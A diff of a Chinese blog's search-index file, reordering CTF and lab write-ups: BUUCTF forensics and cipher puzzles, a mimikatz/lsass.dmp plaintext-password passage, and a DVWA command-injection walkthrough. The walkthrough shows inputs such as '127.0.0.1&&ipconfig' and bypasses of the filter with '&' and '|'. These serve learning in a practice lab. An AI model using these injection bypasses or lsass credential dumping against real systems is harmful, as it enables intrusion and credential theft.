@@ -66,6 +66,66 @@
 ]]></content>
   </entry>
   <entry>
+    <title>buu-1</title>
+    <url>/2021/07/07/buu-1/</url>
+    <content><![CDATA[<h1 id="USB"><a href="#USB" class="headerlink" title="USB"></a>USB</h1><p>ftm文件确确实实是第一次见，先看压缩包吧</p>
+<p><img src="/2021/07/07/buu-1/image-20210707130948481.png"></p>
+<p><img src="/2021/07/07/buu-1/image-20210707131035324.png"></p>
+<p>乍一看好像没什么问题，没想到问题在第二行7A要改成74（文件头错误，以往的题目大多为压缩文件头错误）</p>
+<h2 id="压缩文件头"><a href="#压缩文件头" class="headerlink" title="压缩文件头"></a>压缩文件头</h2><p><img src="https://img-blog.csdnimg.cn/20200509130533242.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L0NsYW1pbmdfRA==,size_16,color_FFFFFF,t_70"></p>
+<h2 id="文件头"><a href="#文件头" class="headerlink" title="文件头"></a>文件头</h2><p><img src="https://img-blog.csdnimg.cn/20200509145606294.png"></p>
+<p>D5 56 ：HEAD_CRC，2字节，也就是文件头部分的crc校验值<br>74 ：HEAD_TYPE，1字节，块类型，74表示块类型是文件头<br>20 90 ：HEAD_FLAGS，2字节，位标记，<br>2D 00 ：HEAD_SIZE，2字节，文件头的全部大小（包含文件名和注释）<br>10 00 00 00 ：PACK_SIZE，4字节，已压缩文件大小<br>10 00 00 00 ：UNP_SIZE，4字节，未压缩文件大小<br>02：HOST_OS，1字节，保存压缩文件使用的操作系统，02代表windows<br>C7 88 67 36：FILE_CRC，4字节，文件的CRC值<br>6D BB 4E 4B ：FTIME，4字节，MS DOS 标准格式的日期和时间<br>1D：UNP_VER，1字节，解压文件所需要的最低RAR版本<br>30：METHOD，1字节，压缩方式，这里是存储压缩<br>08 00 ：NAME_SIZE，2字节，表示文件名大小，这里文件名大小是8字节（flag.txt）<br>20 00 00 00 ：ATTR，4字节，表示文件属性这里是txt文件<br>66 6C 61 67 2E 74 78 74：FILE_NAME（文件名） ，NAME_SIZE字节大小，这里NAME_SIZE大小为8<br>再往后是txt文件内容，一直到第六行 65 结束，下面是另一个文件块的开始</p>
+<p>这个块中存在两个crc值，一个是文件头块中从块类型到文件名这38个字节的校验，后一个则是压缩包中所包含文件的crc校验，解压时，会计算解压后生成文件的crc值，如果等于这里的crc，则解压完成，如果不同，则报错中断。</p>
+<h2 id="结尾块"><a href="#结尾块" class="headerlink" title="结尾块"></a>结尾块</h2><p><img src="/2021/07/07/buu-1/image-20210707132849543.png"></p>
+<p>C4 3D ：HEAD_CRC，2字节，从HEAD_TYPE到HEAD_SIZE的crc校验值 </p>
+<p>7B ：HEAD_TYPE，1字节，表示该块是结尾块 </p>
+<p>00 40： HEAD_FALGS ，2字节，位标记</p>
+<p>07 00 ：HEAD_SIZE，2字节，块大小</p>
+<p>获得png图片，丢到咖啡里，获得二维码</p>
+<p><img src="/2021/07/07/buu-1/image-20210707134330859.png"></p>
+<p>扫出来确实不知道是啥，先放着</p>
+<p>ci{v3erf_0tygidv2_fc0}</p>
+<p>看看ftm文件既然叫key的话就找一下key吧</p>
+<p><img src="/2021/07/07/buu-1/image-20210707135600580.png"></p>
+<p>好像有点东西，是个流量包</p>
+<p>用foremost分离收获两个貌似一样的流量包？</p>
+<p><img src="/2021/07/07/buu-1/image-20210707140501366.png"></p>
+<p>让我康康？这啥</p>
+<p><img src="/2021/07/07/buu-1/image-20210707140829149.png"></p>
+<p>leftover capture data好像有一点点的规律</p>
+<figure class="highlight css"><table><tr><td class="code"><pre><code class="hljs css"><span class="hljs-selector-tag">tshark</span> <span class="hljs-selector-tag">-r</span> <span class="hljs-selector-tag">key</span><span class="hljs-selector-class">.pcap</span> <span class="hljs-selector-tag">-T</span> <span class="hljs-selector-tag">fields</span> <span class="hljs-selector-tag">-e</span> <span class="hljs-selector-tag">usb</span><span class="hljs-selector-class">.capdata</span> &gt; <span class="hljs-selector-tag">usbdata</span><span class="hljs-selector-class">.txt</span><br></code></pre></td></tr></table></figure>
+
+<p>利用kali的shark提取usb的data</p>
+<p><img src="/2021/07/07/buu-1/image-20210709111446327.png"></p>
+<p>在网上发现了个脚本：USB键盘流量包取证工具 , 用于恢复用户的击键信息</p>
+<p>这是加密了嘛，让我康康</p>
+<p>查了一下，维吉尼亚再套栅栏<img src="/2021/07/07/buu-1/099F1FC0.png">（谢谢，有被震撼的)</p>
+<p><img src="/2021/07/07/buu-1/image-20210709112448258.png"></p>
+<p><img src="/2021/07/07/buu-1/image-20210709112509074.png"></p>
+<h2 id="维吉尼亚加密"><a href="#维吉尼亚加密" class="headerlink" title="维吉尼亚加密"></a>维吉尼亚加密</h2><p>我愿意称它为凯撒加密的翻倍</p>
+<p><img src="/2021/07/07/buu-1/58ee3d6d55fbb2fbf9e21dcb434a20a44723dc1a"></p>
+<p>这密密麻麻的看的头就很大，</p>
+<p>维吉尼亚密码是一种简单的多表代换密码(由26个类似的Caesar密码的代换表组成)，</p>
+<p>即由<strong>一些</strong>偏移量不同的恺撒密码组成，这些代换在一起组成了密钥。</p>
+<p>英文中a<del>z，由0</del>25表示。</p>
+<p>假设串长为m，明文为P，密文为C，密钥为K则</p>
+<p>![<a href="equation"></a></p>
+<p>公式这玩意看不懂的话就找几个字母算算，</p>
+<p>取余得到的数字为秘钥所在行的第几个（秘钥可一直循环）</p>
+<h2 id="栅栏密码"><a href="#栅栏密码" class="headerlink" title="栅栏密码"></a>栅栏密码</h2><p><strong>栅栏密码</strong>(Rail fence Cipher)基础型加密方式，是一种简单的移动字符位置的加密方法，首先把加密的明文分成N个一组，然后把每组的第1、第2、第M个字符连起来，形成无规律的密文字符串。</p>
+<p>说的简单一点，分组排列然后竖着读，原来是横着的，举个栗子</p>
+<p>例如字符串“123456789abc”，首先将字符串分成3组，如下排列：<br>1234<br>5678<br>9abc<br>依次取每一组字符，组成加密后密文：”15926a37b48c”。</p>
+<p>————————————————<br>参考资料：<br>原文链接： <a href="https://blog.csdn.net/Claming_D/article/details/105899397">https://blog.csdn.net/Claming_D/article/details/105899397</a></p>
+<p>​                    <a href="https://zhuanlan.zhihu.com/p/111611977">https://zhuanlan.zhihu.com/p/111611977</a></p>
+<p>​                    <a href="https://www.jianshu.com/p/23e3dcb3f0e9">https://www.jianshu.com/p/23e3dcb3f0e9</a></p>
+<p>​                    <a href="http://www.metools.info/code/fence155.html">http://www.metools.info/code/fence155.html</a></p>
+]]></content>
+      <tags>
+        <tag>misc</tag>
+        <tag>crypto</tag>
+      </tags>
+  </entry>
+  <entry>
     <title>buu-2</title>
     <url>/2021/07/09/buu-2/</url>
     <content><![CDATA[<h1 id="base64隐写"><a href="#base64隐写" class="headerlink" title="base64隐写"></a>base64隐写</h1><p>base64编码还是很熟悉了</p>
@@ -166,66 +226,6 @@
       </tags>
   </entry>
   <entry>
-    <title>buu-1</title>
-    <url>/2021/07/07/buu-1/</url>
-    <content><![CDATA[<h1 id="USB"><a href="#USB" class="headerlink" title="USB"></a>USB</h1><p>ftm文件确确实实是第一次见，先看压缩包吧</p>
-<p><img src="/2021/07/07/buu-1/image-20210707130948481.png"></p>
-<p><img src="/2021/07/07/buu-1/image-20210707131035324.png"></p>
-<p>乍一看好像没什么问题，没想到问题在第二行7A要改成74（文件头错误，以往的题目大多为压缩文件头错误）</p>
-<h2 id="压缩文件头"><a href="#压缩文件头" class="headerlink" title="压缩文件头"></a>压缩文件头</h2><p><img src="https://img-blog.csdnimg.cn/20200509130533242.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L0NsYW1pbmdfRA==,size_16,color_FFFFFF,t_70"></p>
-<h2 id="文件头"><a href="#文件头" class="headerlink" title="文件头"></a>文件头</h2><p><img src="https://img-blog.csdnimg.cn/20200509145606294.png"></p>
-<p>D5 56 ：HEAD_CRC，2字节，也就是文件头部分的crc校验值<br>74 ：HEAD_TYPE，1字节，块类型，74表示块类型是文件头<br>20 90 ：HEAD_FLAGS，2字节，位标记，<br>2D 00 ：HEAD_SIZE，2字节，文件头的全部大小（包含文件名和注释）<br>10 00 00 00 ：PACK_SIZE，4字节，已压缩文件大小<br>10 00 00 00 ：UNP_SIZE，4字节，未压缩文件大小<br>02：HOST_OS，1字节，保存压缩文件使用的操作系统，02代表windows<br>C7 88 67 36：FILE_CRC，4字节，文件的CRC值<br>6D BB 4E 4B ：FTIME，4字节，MS DOS 标准格式的日期和时间<br>1D：UNP_VER，1字节，解压文件所需要的最低RAR版本<br>30：METHOD，1字节，压缩方式，这里是存储压缩<br>08 00 ：NAME_SIZE，2字节，表示文件名大小，这里文件名大小是8字节（flag.txt）<br>20 00 00 00 ：ATTR，4字节，表示文件属性这里是txt文件<br>66 6C 61 67 2E 74 78 74：FILE_NAME（文件名） ，NAME_SIZE字节大小，这里NAME_SIZE大小为8<br>再往后是txt文件内容，一直到第六行 65 结束，下面是另一个文件块的开始</p>
-<p>这个块中存在两个crc值，一个是文件头块中从块类型到文件名这38个字节的校验，后一个则是压缩包中所包含文件的crc校验，解压时，会计算解压后生成文件的crc值，如果等于这里的crc，则解压完成，如果不同，则报错中断。</p>
-<h2 id="结尾块"><a href="#结尾块" class="headerlink" title="结尾块"></a>结尾块</h2><p><img src="/2021/07/07/buu-1/image-20210707132849543.png"></p>
-<p>C4 3D ：HEAD_CRC，2字节，从HEAD_TYPE到HEAD_SIZE的crc校验值 </p>
-<p>7B ：HEAD_TYPE，1字节，表示该块是结尾块 </p>
-<p>00 40： HEAD_FALGS ，2字节，位标记</p>
-<p>07 00 ：HEAD_SIZE，2字节，块大小</p>
-<p>获得png图片，丢到咖啡里，获得二维码</p>
-<p><img src="/2021/07/07/buu-1/image-20210707134330859.png"></p>
-<p>扫出来确实不知道是啥，先放着</p>
-<p>ci{v3erf_0tygidv2_fc0}</p>
-<p>看看ftm文件既然叫key的话就找一下key吧</p>
-<p><img src="/2021/07/07/buu-1/image-20210707135600580.png"></p>
-<p>好像有点东西，是个流量包</p>
-<p>用foremost分离收获两个貌似一样的流量包？</p>
-<p><img src="/2021/07/07/buu-1/image-20210707140501366.png"></p>
-<p>让我康康？这啥</p>
-<p><img src="/2021/07/07/buu-1/image-20210707140829149.png"></p>
-<p>leftover capture data好像有一点点的规律</p>
-<figure class="highlight css"><table><tr><td class="code"><pre><code class="hljs css"><span class="hljs-selector-tag">tshark</span> <span class="hljs-selector-tag">-r</span> <span class="hljs-selector-tag">key</span><span class="hljs-selector-class">.pcap</span> <span class="hljs-selector-tag">-T</span> <span class="hljs-selector-tag">fields</span> <span class="hljs-selector-tag">-e</span> <span class="hljs-selector-tag">usb</span><span class="hljs-selector-class">.capdata</span> &gt; <span class="hljs-selector-tag">usbdata</span><span class="hljs-selector-class">.txt</span><br></code></pre></td></tr></table></figure>
-
-<p>利用kali的shark提取usb的data</p>
-<p><img src="/2021/07/07/buu-1/image-20210709111446327.png"></p>
-<p>在网上发现了个脚本：USB键盘流量包取证工具 , 用于恢复用户的击键信息</p>
-<p>这是加密了嘛，让我康康</p>
-<p>查了一下，维吉尼亚再套栅栏<img src="/2021/07/07/buu-1/099F1FC0.png">（谢谢，有被震撼的)</p>
-<p><img src="/2021/07/07/buu-1/image-20210709112448258.png"></p>
-<p><img src="/2021/07/07/buu-1/image-20210709112509074.png"></p>
-<h2 id="维吉尼亚加密"><a href="#维吉尼亚加密" class="headerlink" title="维吉尼亚加密"></a>维吉尼亚加密</h2><p>我愿意称它为凯撒加密的翻倍</p>
-<p><img src="/2021/07/07/buu-1/58ee3d6d55fbb2fbf9e21dcb434a20a44723dc1a"></p>
-<p>这密密麻麻的看的头就很大，</p>
-<p>维吉尼亚密码是一种简单的多表代换密码(由26个类似的Caesar密码的代换表组成)，</p>
-<p>即由<strong>一些</strong>偏移量不同的恺撒密码组成，这些代换在一起组成了密钥。</p>
-<p>英文中a<del>z，由0</del>25表示。</p>
-<p>假设串长为m，明文为P，密文为C，密钥为K则</p>
-<p>![<a href="equation"></a></p>
-<p>公式这玩意看不懂的话就找几个字母算算，</p>
-<p>取余得到的数字为秘钥所在行的第几个（秘钥可一直循环）</p>
-<h2 id="栅栏密码"><a href="#栅栏密码" class="headerlink" title="栅栏密码"></a>栅栏密码</h2><p><strong>栅栏密码</strong>(Rail fence Cipher)基础型加密方式，是一种简单的移动字符位置的加密方法，首先把加密的明文分成N个一组，然后把每组的第1、第2、第M个字符连起来，形成无规律的密文字符串。</p>
-<p>说的简单一点，分组排列然后竖着读，原来是横着的，举个栗子</p>
-<p>例如字符串“123456789abc”，首先将字符串分成3组，如下排列：<br>1234<br>5678<br>9abc<br>依次取每一组字符，组成加密后密文：”15926a37b48c”。</p>
-<p>————————————————<br>参考资料：<br>原文链接： <a href="https://blog.csdn.net/Claming_D/article/details/105899397">https://blog.csdn.net/Claming_D/article/details/105899397</a></p>
-<p>​                    <a href="https://zhuanlan.zhihu.com/p/111611977">https://zhuanlan.zhihu.com/p/111611977</a></p>
-<p>​                    <a href="https://www.jianshu.com/p/23e3dcb3f0e9">https://www.jianshu.com/p/23e3dcb3f0e9</a></p>
-<p>​                    <a href="http://www.metools.info/code/fence155.html">http://www.metools.info/code/fence155.html</a></p>
-]]></content>
-      <tags>
-        <tag>misc</tag>
-        <tag>crypto</tag>
-      </tags>
-  </entry>
-  <entry>
     <title>buu-4</title>
     <url>/2021/07/11/buu-4/</url>
     <content><![CDATA[<h1 id="菜刀666"><a href="#菜刀666" class="headerlink" title="菜刀666"></a>菜刀666</h1><p>流量分析啊，还是要耐心一点，一个一个的看过去，那你就会发现有不一样的地方<del>（当然要在方向正确的情况下，不然就会看个寂寞。。。。。。。）</del></p>
@@ -249,6 +249,45 @@
 <p>重复的ascii就是正确的ascii</p>
 <p>由于导出的文件是一句一个，我觉得直接看可能比脚本快一点<del>（你懒你就直说</del>）~~</p>
 <p>不同的是这题ascii转出来就是flag，虎符那题要再base64进行转换。</p>
+]]></content>
+      <tags>
+        <tag>misc</tag>
+      </tags>
+  </entry>
+  <entry>
+    <title>buu-5</title>
+    <url>/2021/07/14/buu-5/</url>
+    <content><![CDATA[<h1 id="Mysterious"><a href="#Mysterious" class="headerlink" title="Mysterious"></a>Mysterious</h1><p>我真的没点错题吗，逆向吧这波（好的题目写了。。。。。。），让我康康ida怎么用</p>
+<p>略微知道亿点点操作以后</p>
+<p><img src="/2021/07/14/buu-5/image-20210715135954810.png"></p>
+<p>这个伪代码还是可以看懂的，拼接就完事了</p>
+<h1 id="SWPU2019-伟大的侦探"><a href="#SWPU2019-伟大的侦探" class="headerlink" title="[SWPU2019]伟大的侦探"></a>[SWPU2019]伟大的侦探</h1><p>开局就跪了，这个编码是我不知道的了</p>
+<p><img src="/2021/07/14/buu-5/image-20210714191544093.png"></p>
+<p>EBCDIC（Extended Binary Coded Decimal Interchange Code）扩增二进式十进交换码，为IBM于1963年－1964年间推出的字符编码表，根据早期打孔机式的二进化十进数（BCD，Bindary Coded Decimal）排列而成。是IBM迷尔级以上电脑的标准码。<a href="https://www.qqxiuzi.cn/wz/zixun/1665.htm">https://www.qqxiuzi.cn/wz/zixun/1665.htm</a></p>
+<p><img src="/2021/07/14/buu-5/image-20210714195000670.png"></p>
+<p>解个跳舞小人（福尔摩斯小人密码）</p>
+<p><img src="/2021/07/14/buu-5/image-20201031092252316.png"></p>
+<p>flag{iloveholmesandwllm}和图片对应一下就可以找到了</p>
+<h1 id="SWPU2019-你有没有好好看网课"><a href="#SWPU2019-你有没有好好看网课" class="headerlink" title="[SWPU2019]你有没有好好看网课?"></a>[SWPU2019]你有没有好好看网课?</h1><p>谢邀，网课就没好好看过，眼睛不好属实看不见，了解到了一个新工具kinovea</p>
+<p><img src="/2021/07/14/buu-5/image-20210714205043569.png"></p>
+<p>这不放大一帧一帧看鬼看得见，找了好久，前面的flag.docx有提示5和7然后其实有个放大镜没有显示出来，但是列文虎克的话暗示显微镜<img src="/2021/07/14/buu-5/256767E4.png">吧</p>
+<p>（真的好小，我需要一双列文虎克的眼睛）</p>
+<p>后面还有一串base64，拼起来就是flag2压缩包密码，解完之后用010打开，搜索ctf即可找到flag。</p>
+<h1 id="MRCTF2020-ezmisc"><a href="#MRCTF2020-ezmisc" class="headerlink" title="[MRCTF2020]ezmisc"></a>[MRCTF2020]ezmisc</h1><p>没啥想说的，写一个小技巧，当</p>
+<p><img src="/2021/07/14/buu-5/image-20210717125159751.png"></p>
+<p>crc 报错时可以尝试去改一下图片高（很奇怪，我的010并不报错</p>
+<h1 id="弱口令"><a href="#弱口令" class="headerlink" title="弱口令"></a>弱口令</h1><p>我以为是压缩包弱口令，尝试爆破，n分钟后，无果，发现压缩包有别的信息</p>
+<p><img src="/2021/07/14/buu-5/image-20210718134018368.png"></p>
+<p>但是好像看不出来是什么，复制一下，在各种文本编辑器里试图查看</p>
+<p><img src="/2021/07/14/buu-5/image-20210718134159164.png"></p>
+<p>你看这像不像莫斯密码</p>
+<p><img src="/2021/07/14/buu-5/image-20210718135411821.png"></p>
+<p>被→ 坑了一下这个是长的（包括了一个空格）然后一行是一个字母，就可以解压了</p>
+<p>png图片，通道分析完感觉是lsb隐写，但是解不出来，根据题目弱口令</p>
+<p>找到脚本，<a href="https://github.com/livz/cloacked-pixel">https://github.com/livz/cloacked-pixel</a></p>
+<p>模块安装n小时，<del>（每一台kali都有他的脾气</del></p>
+<p><img src="/2021/07/14/buu-5/image-20210718162413435.png"></p>
+<p><del>（终于成功了，太感人了</del></p>
 ]]></content>
       <tags>
         <tag>misc</tag>
@@ -319,93 +358,20 @@
 <p>用到mimikatz获取明文密码，现在又需要lsass.dmp这个进程的内存</p>
 <p>lsass是<a href="http://d.hatena.ne.jp/keyword/windows">windows</a>系统的一个进程，用于本地安全和登陆策略。</p>
 <p>导出lsass.dmp文件</p>
+<p>尝试使用mimikatz，很奇怪，怎么都打不开，各种打不开，各种拒绝访问，几个小时过去了，在确定自己的用户为管理员之后，把所有的杀毒软件关掉后，用管理员运行模式打开，<img src="/2021/07/19/buu-6/073E6641.jpg"><span class="image-caption">img</span>终于啊<img src="/2021/07/19/buu-6/image-20210721234435678.png"><span class="image-caption">image-20210721234435678</span></p>
+<p>debug检查一下</p>
+<p><img src="/2021/07/19/buu-6/image-20210722001149114.png"><span class="image-caption">image-20210722001149114</span></p>
+<p><img src="https://images.cnblogs.com/cnblogs_com/LEOGG321/1850290/o_2009181317142.png"><span class="image-caption">image-20200918211554925</span></p>
+<p><img src="/2021/07/19/buu-6/image-20210722000642035.png"><span class="image-caption">image-20210722000642035</span></p>
+<p><img src="/2021/07/19/buu-6/image-20210722000755964.png"><span class="image-caption">image-20210722000755964</span></p>
+<p>妙啊</p>
+<p>不过mimikatz有时间还是要好好研究一下的</p>
 <h1 id="XMAN2018排位赛-通行证"><a href="#XMAN2018排位赛-通行证" class="headerlink" title="[XMAN2018排位赛]通行证"></a>[XMAN2018排位赛]通行证</h1><p>很明显的base64</p>
 <p>很难想象，不同的栅栏密码解密出来的结果是不一样的，发一个能用的<a href="http://ctf.ssleye.com/railfence.html">http://ctf.ssleye.com/railfence.html</a></p>
 <p>然后凯撒移位，over</p>
 ]]></content>
       <tags>
         <tag>misc</tag>
-      </tags>
-  </entry>
-  <entry>
-    <title>buu-5</title>
-    <url>/2021/07/14/buu-5/</url>
-    <content><![CDATA[<h1 id="Mysterious"><a href="#Mysterious" class="headerlink" title="Mysterious"></a>Mysterious</h1><p>我真的没点错题吗，逆向吧这波（好的题目写了。。。。。。），让我康康ida怎么用</p>
-<p>略微知道亿点点操作以后</p>
-<p><img src="/2021/07/14/buu-5/image-20210715135954810.png"></p>
-<p>这个伪代码还是可以看懂的，拼接就完事了</p>
-<h1 id="SWPU2019-伟大的侦探"><a href="#SWPU2019-伟大的侦探" class="headerlink" title="[SWPU2019]伟大的侦探"></a>[SWPU2019]伟大的侦探</h1><p>开局就跪了，这个编码是我不知道的了</p>
-<p><img src="/2021/07/14/buu-5/image-20210714191544093.png"></p>
-<p>EBCDIC（Extended Binary Coded Decimal Interchange Code）扩增二进式十进交换码，为IBM于1963年－1964年间推出的字符编码表，根据早期打孔机式的二进化十进数（BCD，Bindary Coded Decimal）排列而成。是IBM迷尔级以上电脑的标准码。<a href="https://www.qqxiuzi.cn/wz/zixun/1665.htm">https://www.qqxiuzi.cn/wz/zixun/1665.htm</a></p>
-<p><img src="/2021/07/14/buu-5/image-20210714195000670.png"></p>
-<p>解个跳舞小人（福尔摩斯小人密码）</p>
-<p><img src="/2021/07/14/buu-5/image-20201031092252316.png"></p>
-<p>flag{iloveholmesandwllm}和图片对应一下就可以找到了</p>
-<h1 id="SWPU2019-你有没有好好看网课"><a href="#SWPU2019-你有没有好好看网课" class="headerlink" title="[SWPU2019]你有没有好好看网课?"></a>[SWPU2019]你有没有好好看网课?</h1><p>谢邀，网课就没好好看过，眼睛不好属实看不见，了解到了一个新工具kinovea</p>
-<p><img src="/2021/07/14/buu-5/image-20210714205043569.png"></p>
-<p>这不放大一帧一帧看鬼看得见，找了好久，前面的flag.docx有提示5和7然后其实有个放大镜没有显示出来，但是列文虎克的话暗示显微镜<img src="/2021/07/14/buu-5/256767E4.png">吧</p>
-<p>（真的好小，我需要一双列文虎克的眼睛）</p>
-<p>后面还有一串base64，拼起来就是flag2压缩包密码，解完之后用010打开，搜索ctf即可找到flag。</p>
-<h1 id="MRCTF2020-ezmisc"><a href="#MRCTF2020-ezmisc" class="headerlink" title="[MRCTF2020]ezmisc"></a>[MRCTF2020]ezmisc</h1><p>没啥想说的，写一个小技巧，当</p>
-<p><img src="/2021/07/14/buu-5/image-20210717125159751.png"></p>
-<p>crc 报错时可以尝试去改一下图片高（很奇怪，我的010并不报错</p>
-<h1 id="弱口令"><a href="#弱口令" class="headerlink" title="弱口令"></a>弱口令</h1><p>我以为是压缩包弱口令，尝试爆破，n分钟后，无果，发现压缩包有别的信息</p>
-<p><img src="/2021/07/14/buu-5/image-20210718134018368.png"></p>
-<p>但是好像看不出来是什么，复制一下，在各种文本编辑器里试图查看</p>
-<p><img src="/2021/07/14/buu-5/image-20210718134159164.png"></p>
-<p>你看这像不像莫斯密码</p>
-<p><img src="/2021/07/14/buu-5/image-20210718135411821.png"></p>
-<p>被→ 坑了一下这个是长的（包括了一个空格）然后一行是一个字母，就可以解压了</p>
-<p>png图片，通道分析完感觉是lsb隐写，但是解不出来，根据题目弱口令</p>
-<p>找到脚本，<a href="https://github.com/livz/cloacked-pixel">https://github.com/livz/cloacked-pixel</a></p>
-<p>模块安装n小时，<del>（每一台kali都有他的脾气</del></p>
-<p><img src="/2021/07/14/buu-5/image-20210718162413435.png"></p>
-<p><del>（终于成功了，太感人了</del></p>
-]]></content>
-      <tags>
-        <tag>misc</tag>
-      </tags>
-  </entry>
-  <entry>
-    <title>dvwa-commend injection</title>
-    <url>/2021/02/11/dvwa-commend-injection/</url>
-    <content><![CDATA[<h2 id="简短介绍"><a href="#简短介绍" class="headerlink" title="简短介绍"></a>简短介绍</h2><p>Command Injection，即命令注入，是指通过提交恶意构造的参数破坏命令语句结构，从而达到执行恶意命令的目的。</p>
-<h1 id="low"><a href="#low" class="headerlink" title="low"></a>low</h1><p><img src="/2021/02/11/dvwa-commend-injection/image-20210211154407884.png"></p>
-<p>来看看源代码，这里是要我们输入ip地址看能不能ping通，但是由于没有ip参数并未做任何的过滤，导致了严重的命令注入漏洞。</p>
-<p>这边有用到这两个函数</p>
-<p>stristr函数搜索字符串在另一字符串中的第一次出现，返回字符串的剩余部分（从匹配点），如果未找到所搜索的字符串，则返回 FALSE。参数string规定被搜索的字符串，参数search规定要搜索的字符串（如果该参数是数字，则搜索匹配该数字对应的 ASCII 值的字符），可选参数before_true为布尔型，默认为”false” ，如果设置为 “true”，函数将返回 search 参数第一次出现之前的字符串部分。</p>
-<p><em>php_uname(mode)</em></p>
-<p>这个函数会返回运行php的操作系统的相关描述，参数mode可取值”a” （此为默认，包含序列”s n r v m”里的所有模式），”s ”（返回操作系统名称），”n”（返回主机名），” r”（返回版本名称），”v”（返回版本信息）， ”m”（返回机器类型）。</p>
-<p><img src="/2021/02/11/dvwa-commend-injection/image-20210211160508019.png"></p>
-<p>我们可以利用&amp;&amp;来写一点别的命令</p>
-<p><img src="/2021/02/11/dvwa-commend-injection/image-20210211160623988.png"></p>
-<p>或者查一个ipconfig</p>
-<p>127.0.0.1&amp;&amp;ipconfig</p>
-<p><img src="/2021/02/11/dvwa-commend-injection/image-20210211160805813.png"></p>
-<h1 id="medium"><a href="#medium" class="headerlink" title="medium"></a>medium</h1><p><img src="/2021/02/11/dvwa-commend-injection/image-20210211161031551.png"></p>
-<p>简单来说就是对&amp;&amp;和;进行过滤，我们可以通过&amp;;&amp;或者&amp;进行绕过</p>
-<p>这里需要注意的是”&amp;&amp;”与” &amp;”的区别：</p>
-<p>Command 1&amp;&amp;Command 2</p>
-<p>先执行Command 1，执行成功后执行Command 2，否则不执行Command 2</p>
-<h1 id="high"><a href="#high" class="headerlink" title="high"></a>high</h1><p><img src="/2021/02/11/dvwa-commend-injection/image-20210211162506546.png"></p>
-<p>被过滤的字符增加了，但是有有有有一条漏网之鱼，|  </p>
-<p>对黑名单里的是| （对有一个括号，绕就对了 </p>
-<p>Command 1 | Command 2</p>
-<p>“|”是管道符，表示将Command 1的输出作为Command 2的输入，并且只打印Command 2执行的结果。</p>
-<p><img src="/2021/02/11/dvwa-commend-injection/image-20210211212419051.png"></p>
-<p>成功</p>
-<h1 id="impossible"><a href="#impossible" class="headerlink" title="impossible"></a>impossible</h1><p><img src="/2021/02/11/dvwa-commend-injection/image-20210211212857397.png"></p>
-<p>相关函数介绍</p>
-<p><em>stripslashes(string)</em></p>
-<p>stripslashes函数会删除字符串string中的反斜杠，返回已剥离反斜杠的字符串。</p>
-<p><em>explode(separator,string,limit)</em></p>
-<p>把字符串打散为数组，返回字符串的数组。参数separator规定在哪里分割字符串，参数string是要分割的字符串，可选参数limit规定所返回的数组元素的数目。</p>
-<p><em>is_numeric(string)</em></p>
-<p>检测string是否为数字或数字字符串，如果是返回TRUE，否则返回FALSE。</p>
-<p>可以看到，Impossible级别的代码加入了Anti-CSRF token，同时对参数ip进行了严格的限制，只有诸如“数字.数字.数字.数字”的输入才会被接收执行，因此不存在命令注入漏洞。</p>
-]]></content>
-      <tags>
-        <tag>dvwa</tag>
       </tags>
   </entry>
   <entry>
@@ -448,6 +414,48 @@
 <p><img src="/2021/02/16/dvwa-csp-bypass/image-20210218235758504.png"></p>
 <h1 id="impossible"><a href="#impossible" class="headerlink" title="impossible"></a>impossible</h1><p>这个级别是 high 级别的加强，JSONP 调用的回调函数是硬编码的，CSP 策略被锁定为只允许外部脚本。</p>
 <p>参考链接：<a href="https://www.cnblogs.com/linfangnan/p/13714694.htm">https://www.cnblogs.com/linfangnan/p/13714694.htm</a></p>
+]]></content>
+      <tags>
+        <tag>dvwa</tag>
+      </tags>
+  </entry>
+  <entry>
+    <title>dvwa-commend injection</title>
+    <url>/2021/02/11/dvwa-commend-injection/</url>
+    <content><![CDATA[<h2 id="简短介绍"><a href="#简短介绍" class="headerlink" title="简短介绍"></a>简短介绍</h2><p>Command Injection，即命令注入，是指通过提交恶意构造的参数破坏命令语句结构，从而达到执行恶意命令的目的。</p>
+<h1 id="low"><a href="#low" class="headerlink" title="low"></a>low</h1><p><img src="/2021/02/11/dvwa-commend-injection/image-20210211154407884.png"></p>
+<p>来看看源代码，这里是要我们输入ip地址看能不能ping通，但是由于没有ip参数并未做任何的过滤，导致了严重的命令注入漏洞。</p>
+<p>这边有用到这两个函数</p>
+<p>stristr函数搜索字符串在另一字符串中的第一次出现，返回字符串的剩余部分（从匹配点），如果未找到所搜索的字符串，则返回 FALSE。参数string规定被搜索的字符串，参数search规定要搜索的字符串（如果该参数是数字，则搜索匹配该数字对应的 ASCII 值的字符），可选参数before_true为布尔型，默认为”false” ，如果设置为 “true”，函数将返回 search 参数第一次出现之前的字符串部分。</p>
+<p><em>php_uname(mode)</em></p>
+<p>这个函数会返回运行php的操作系统的相关描述，参数mode可取值”a” （此为默认，包含序列”s n r v m”里的所有模式），”s ”（返回操作系统名称），”n”（返回主机名），” r”（返回版本名称），”v”（返回版本信息）， ”m”（返回机器类型）。</p>
+<p><img src="/2021/02/11/dvwa-commend-injection/image-20210211160508019.png"></p>
+<p>我们可以利用&amp;&amp;来写一点别的命令</p>
+<p><img src="/2021/02/11/dvwa-commend-injection/image-20210211160623988.png"></p>
+<p>或者查一个ipconfig</p>
+<p>127.0.0.1&amp;&amp;ipconfig</p>
+<p><img src="/2021/02/11/dvwa-commend-injection/image-20210211160805813.png"></p>
+<h1 id="medium"><a href="#medium" class="headerlink" title="medium"></a>medium</h1><p><img src="/2021/02/11/dvwa-commend-injection/image-20210211161031551.png"></p>
+<p>简单来说就是对&amp;&amp;和;进行过滤，我们可以通过&amp;;&amp;或者&amp;进行绕过</p>
+<p>这里需要注意的是”&amp;&amp;”与” &amp;”的区别：</p>
+<p>Command 1&amp;&amp;Command 2</p>
+<p>先执行Command 1，执行成功后执行Command 2，否则不执行Command 2</p>
+<h1 id="high"><a href="#high" class="headerlink" title="high"></a>high</h1><p><img src="/2021/02/11/dvwa-commend-injection/image-20210211162506546.png"></p>
+<p>被过滤的字符增加了，但是有有有有一条漏网之鱼，|  </p>
+<p>对黑名单里的是| （对有一个括号，绕就对了 </p>
+<p>Command 1 | Command 2</p>
+<p>“|”是管道符，表示将Command 1的输出作为Command 2的输入，并且只打印Command 2执行的结果。</p>
+<p><img src="/2021/02/11/dvwa-commend-injection/image-20210211212419051.png"></p>
+<p>成功</p>
